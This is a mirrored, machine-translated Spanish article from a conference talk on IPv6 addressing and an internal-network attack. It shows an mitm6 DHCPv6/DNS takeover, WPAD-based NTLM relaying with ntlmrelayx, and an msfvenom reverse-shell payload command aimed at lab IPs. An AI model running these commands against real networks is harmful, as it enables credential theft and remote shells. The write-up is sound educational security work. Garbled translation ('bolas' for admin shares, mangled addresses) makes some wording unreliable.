<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üíÉüèª üÄÑÔ∏è ‚ùé D√≥nde insertar comillas en IPv6 üë®‚Äçüé§ üíÜüèø üò¶</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="IPv6 es una nueva versi√≥n del protocolo de Internet. Los miembros del IETF lo aceptaron hace solo 22 a√±os, en 1996. Durante este tiempo, los ataques e...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>D√≥nde insertar comillas en IPv6</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pm/blog/417285/"> IPv6 es una nueva versi√≥n del protocolo de Internet.  Los miembros del IETF lo aceptaron hace solo 22 a√±os, en 1996.  Durante este tiempo, los ataques espec√≠ficos de IPv6 lograron aparecer.  El prop√≥sito de este art√≠culo, basado en nuestra presentaci√≥n en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PHDays 8,</a> es mostrar las posibilidades de un ataque a redes corporativas por parte de un intruso interno que utiliza IPv4 e IPv6. <br><br><img src="https://habrastorage.org/webt/ls/nb/b7/lsnbb7p7odub6aicoy6uylbvcak.png"><br><a name="habracut"></a><br><h2>  Conceptos b√°sicos de direccionamiento IPv6 </h2><br>  La longitud de la direcci√≥n IPv6 es de 128 bits, que se escriben en formato hexadecimal con la divisi√≥n de la direcci√≥n completa en 8 grupos.  Un ejemplo de escritura de una direcci√≥n IPv6: <br><br>  2001: 0a00: caf√©: beb√©: 0001: 0000: 0000: 0011/64 <br><br>  Hay un registro de direcci√≥n simplificado cuando varios grupos posteriores de ceros pueden reemplazarse con ‚Äú::‚Äù, pero solo una vez.  Los ceros escritos a la izquierda en cada grupo se pueden descartar.  Entonces, la direcci√≥n anterior se puede escribir como: <br><br>  2001: a00: caf√©: beb√©: 1 :: 11/64 <br><br>  El tama√±o est√°ndar de la parte del host emitida por el proveedor al cliente es de 64 bits, de los cuales 4 se utilizan para segmentar la red en subredes. <br><br><img src="https://habrastorage.org/webt/ae/0r/2b/ae0r2bmvkfpwm8bvbwdlui_560i.png"><br><br>  Hay varios tipos de direcciones en IPv6: <br><br><img src="https://habrastorage.org/webt/cr/e2/zz/cre2zzzair09k_qyg-ozm_olyno.png"><br>  <b>La unidifusi√≥n global</b> es un an√°logo de direcciones p√∫blicas en IPv4.  Estas direcciones son emitidas por <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">IANA</a> y son √∫nicas en Internet.  Estas direcciones est√°n en el rango 2000 :: / 3 (2000 - 3FFF). <br><br>  <b>Direcciones locales (Link-local)</b> : las direcciones en el rango FE80 :: / 10 (FE80 - FEBF) son generadas autom√°ticamente por los dispositivos y se utilizan para interactuar con otros dispositivos en la misma red local.  El tr√°fico que contiene esta direcci√≥n como remitente o destinatario no se debe enrutar.  Por lo tanto, un dispositivo que admite IPv6 y est√° conectado a la red puede intercambiar inmediatamente informaci√≥n dentro de su subred sin ninguna configuraci√≥n. <br><br>  <b>Direcci√≥n de bucle invertido :: 1</b> .  Esta direcci√≥n es similar a 127.0.0.1 en IPv4.  Los paquetes que se le env√≠an no salen del dispositivo. <br><br>  <b>Direcci√≥n no especificada</b> : la direcci√≥n "::", que consta de solo ceros.  Se usa en algunos casos como remitente hasta que se recibe la direcci√≥n. <br><br>  <b>Direcciones locales √∫nicas (Local √∫nico)</b> : un an√°logo de direcciones privadas en IPv4, puede enrutarse dentro de la red interna de la organizaci√≥n, sin la posibilidad de enrutamiento a Internet.  El espacio de direcciones IPv6 es tan grande que se pueden emitir m√°s de un bill√≥n de direcciones a cada persona en el planeta y no terminar√°n.  Por lo tanto, IPv6 implica el abandono de direcciones privadas en el sentido en que se utilizaron en IPv4 debido a la falta de direcciones p√∫blicas. <br><br>  <b>Direcciones IPv4 asignadas a IPv6 (IPv4 incrustado)</b> : direcciones IPv6 que comienzan con :: ffff: los √∫ltimos 32 bits contienen una direcci√≥n IPv4 (:: ffff: xxxx: xxxx, donde xxxx: xxxx es la direcci√≥n IPv4 convertida a hexadecimal).  Estas direcciones se utilizan para dispositivos que no admiten IPv6 y proporcionan una forma de asignar un espacio de direcciones IPv4 a un espacio de direcciones IPv6. <br><br>  <b>Direcciones de multidifusi√≥n (Multicast)</b> : uno de los cambios clave en IPv6 en comparaci√≥n con IPv4.  El nuevo protocolo rechaz√≥ los paquetes de difusi√≥n, en lugar de la direcci√≥n de difusi√≥n se utilizan las direcciones de multidifusi√≥n.  Todas estas direcciones est√°n en el rango FF00 :: / 8 <br><br><img src="https://habrastorage.org/webt/gw/io/c6/gwioc6toxuatii_wzugt5yb3j2w.png"><br><br><h3>  Asignaci√≥n de direcci√≥n IPv6 </h3><br>  IPv6 usa el ICMPv6 Neighbour Discovery Protocol (ND) para obtener informaci√≥n de la direcci√≥n.  Como se muestra en la figura siguiente, cuando aparece un nuevo dispositivo en la red IPv6, el dispositivo env√≠a una solicitud para obtener una direcci√≥n IPv6 (Solicitud de enrutador) a "ff02 :: 2" (todos los enrutadores de red).  El enrutador responde con un mensaje (Anuncio de enrutador) que contiene informaci√≥n sobre c√≥mo obtener la direcci√≥n IPv6.  Dependiendo de las banderas establecidas en el mensaje, hay tres formas: <br><table><tbody><tr><th>  La forma de obtener la direcci√≥n </th><th>  Una bandera (autom√°tica) </th><th>  O (Otro) bandera </th><th>  Indicador M (administrado) </th></tr><tr><td>  SLAAC (predeterminado) </td><td>  1 </td><td>  0 0 </td><td>  0 0 </td></tr><tr><td>  SLAAC + DHCPv6 </td><td>  1 </td><td>  1 </td><td>  0 0 </td></tr><tr><td>  DHCPv6 </td><td>  0 0 </td><td>  - </td><td>  1 </td></tr></tbody></table><br>  <b>SLAAC</b> (Autoconfiguraci√≥n de direcciones sin estado): en este caso, todo lo necesario para generar una direcci√≥n IPv6 global est√° en el mensaje RA. <br><br>  <b>SLAAC + DHCPv6</b> : adem√°s de en el caso de SLAAC, la direcci√≥n se genera en funci√≥n de la informaci√≥n en el paquete RA, pero el indicador O se establece adicionalmente, lo que significa Otra configuraci√≥n, y el dispositivo debe comunicarse con el servidor DHCPv6 para obtener configuraciones adicionales, por ejemplo, el servidor DNS. <br><br>  <b>DHCPv6</b> es un an√°logo de la direcci√≥n DHCPv4 y el servidor DHCP emite toda otra informaci√≥n, con la excepci√≥n de la puerta de enlace predeterminada, que se toma de la direcci√≥n del remitente del paquete RA. <br><br>  Cuando las banderas O y M se configuran al mismo tiempo, la bandera O se ignora. <br><br><img src="https://habrastorage.org/webt/qx/nh/yw/qxnhywmpu6bpogmnss7c0emprpa.jpeg"><br>  Como ejemplo, tome la utilidad fake_router26 del conjunto de utilidades <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">thc-ipv6</a> .  La imagen muestra que despu√©s de comenzar, se agreg√≥ la direcci√≥n IPv6 de la puerta de enlace predeterminada, que se convirti√≥ en prioridad sobre IPv4. <br><br><img src="https://habrastorage.org/webt/mr/qc/45/mrqc45-7fxz_clcr6affsl69i9e.png"><br><br><h2>  Ataque </h2><br>  En este escenario, consideraremos la posibilidad de un ataque de hombre en el medio utilizando el mecanismo para obtener la configuraci√≥n de red IPv6. <br><br>  Para la demostraci√≥n, necesitamos 4 autos: <br><br>  <b>La m√°quina atacante es</b> Kali Linux. <br><br><img src="https://habrastorage.org/webt/2z/rj/2p/2zrj2parlezr5m5thp1abcskgxo.png"><br><br>  <b>La m√°quina del servidor</b> en la que se encender√°n las bolas de administraci√≥n de Windows 7. <br><br><img src="https://habrastorage.org/webt/tl/n3/qj/tln3qjafwp_zhancgxbpogpd5u4.png"><br><br>  <b>Una m√°quina cliente</b> que tendr√° acceso a un servidor Windows 7. <br><br><img src="https://habrastorage.org/webt/ob/vb/82/obvb82baad3u7bd4cmjlm-54atc.png"><br><br>  Un enrutador con DHCPv4 habilitado. <br><br>  dirkjanm describi√≥ la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">metodolog√≠a para</a> este escenario.  Escribi√≥ la utilidad mitm6, que, utilizando el protocolo ND, env√≠a mensajes de anuncio de enrutador con los indicadores "O" y "M" en "1".  Por lo tanto, los clientes saben que es necesario solicitar informaci√≥n de direcci√≥n de un servidor DHCPv6.  Los clientes comienzan a enviar mensajes SOLICITADOS DHCPv6 para descubrir el servidor DHCP.  La utilidad responde a las solicitudes con mensajes de publicidad DHCPv6;  la respuesta contiene la direcci√≥n de la m√°quina atacante como un servidor DNS. <br><br><img alt="Solicitud de informaci√≥n de direcci√≥n enviada a la direcci√≥n de multidifusi√≥n de todos los servidores DHCP ff02 :: 1: 2" src="https://habrastorage.org/webt/ze/if/di/zeifdiuqvmjxgmsakw5nz5dqqau.png"><br><br>  Despu√©s de eso, debido a las caracter√≠sticas arquitect√≥nicas del sistema operativo, el DNS DHCPv6 se convierte en una prioridad.  Ahora el atacante puede responder a cualquier consulta DNS con la direcci√≥n correcta.  Por lo tanto, la solicitud enviada por el nombre de dominio se enviar√° a discreci√≥n del atacante. <br><br>  Al ejecutar mitm6, puede especificar el dominio para el que sustituir las direcciones DNS. <br><br><img src="https://habrastorage.org/webt/cj/b5/mt/cjb5mthduecqu62-iig9ed9u24w.png"><br><br><img src="https://habrastorage.org/webt/ox/bz/bu/oxbzbuxhk777trjsfvr4idkkgdw.png"><br><br><h2>  Bolas de administraci√≥n </h2><br>  Para mejorar el efecto dram√°tico, suponga que hay otra m√°quina en la red en la cual el usuario de la primera m√°quina puede conectarse a pelotas administrativas.  Por defecto, est√°n apagados, pero en Internet mucha gente est√° interesada en c√≥mo encenderlos, y est√°n muy contentos cuando lo obtienen. <br><br><img src="https://habrastorage.org/webt/gi/yj/qt/giyjqt4gwprslmxgsgc_i2b_5_k.jpeg"><br><br><img src="https://habrastorage.org/webt/d-/gg/mp/d-ggmpf_b9oztu5dfrotewmbw9o.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">WPAD</a> (Web Proxy Auto Discovery) es un protocolo para determinar la ubicaci√≥n del archivo en el que se encuentran las configuraciones de proxy predeterminadas. <br><br>  Despu√©s de actualizar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">MS16-077,</a> wpad ya no se administra a trav√©s de NETBIOS y no se autentica autom√°ticamente en el servidor proxy. <br><br>  Para evitar estas restricciones, puede usar ntlmrelayx.py, que es parte de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">impacket</a> .  Se requiere una versi√≥n superior a 0.9.16, que incluye soporte para IPv6 y la capacidad de instalar un servidor que represente un wpad v√°lido.  El lanzamiento lo realiza el equipo. <br><br><pre><code class="bash hljs">ntlmrelayx.py -6 -wh at.localdomain -t smb://192.168.56.7 -e 1.exe</code> </pre> <br>  donde 1.exe es la carga √∫til de shell inverso generada por el metasplit. <br><br><pre> <code class="bash hljs">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.6 LPORT=444 -f exe -o 1.exe</code> </pre> <br>  el par√°metro -wh indica el host donde se encuentra el archivo wpad (la utilidad mitm6 responder√° con la direcci√≥n del atacante a esta solicitud) <br><br><img src="https://habrastorage.org/webt/4e/ew/hh/4eewhhpvwjynispsnazoyftxtus.png"><br><br><img src="https://habrastorage.org/webt/p1/it/aa/p1itaa9idtzcavemj45sgzsbeeq.png"><br><br>  Despu√©s de conectarse, se solicitar√° la autenticaci√≥n HTTP 407 (se requiere autenticaci√≥n de proxy), en la cual el navegador se autentica autom√°ticamente. <br><br><img src="https://habrastorage.org/webt/fw/hn/qz/fwhnqzgqri-snconlo2sdpubcmc.png"><br><br><img src="https://habrastorage.org/webt/f5/hf/1x/f5hf1xuyeourcueod8v70dqilsa.png"><br><br>  Los datos recibidos se utilizar√°n para conectarse al smb del servidor atacado, pasados ‚Äã‚Äãa trav√©s del par√°metro -t. <br><br><img src="https://habrastorage.org/webt/xa/hu/0e/xahu0errtgiiuzu9j_b1990pryq.png"><br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/WO2jeo85Mpg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  Agradezco a mi coautor Sergey Ovchinnikov <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">malchikserega</a> por su ayuda en la preparaci√≥n de la presentaci√≥n y el art√≠culo. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es417285/">https://habr.com/ru/post/es417285/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es417271/index.html">¬øPuede un hacker bloquear el Canal de la Mancha?</a></li>
<li><a href="../es417273/index.html">Realizaci√≥n de una gu√≠a de voz basada en YandexSpeechKit</a></li>
<li><a href="../es417275/index.html">7 habilidades de dise√±adores efectivos. Potentes herramientas de desarrollo profesional</a></li>
<li><a href="../es417277/index.html">Bibliotecas gratuitas para crear y editar archivos PDF</a></li>
<li><a href="../es417283/index.html">Disney present√≥ su propio sistema de animaci√≥n capilar HairControl</a></li>
<li><a href="../es417287/index.html">"Calendario de prueba" para julio. Pruebas anal√≠ticas</a></li>
<li><a href="../es417289/index.html">Diario del aprendiz: D√≠a 1. Aprendiz a junior</a></li>
<li><a href="../es417293/index.html">Recuperaci√≥n de contrase√±a y almacenamiento primario en la nube, o Novedades de Zimbra 8.8.9</a></li>
<li><a href="../es417295/index.html">¬øC√≥mo escrib√≠ la biblioteca est√°ndar de C ++ 11 o por qu√© boost es tan aterrador? Capitulo 3</a></li>
<li><a href="../es417297/index.html">Inteligencia sobre amenazas de miedo y asco u 8 consejos pr√°cticos de TI</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>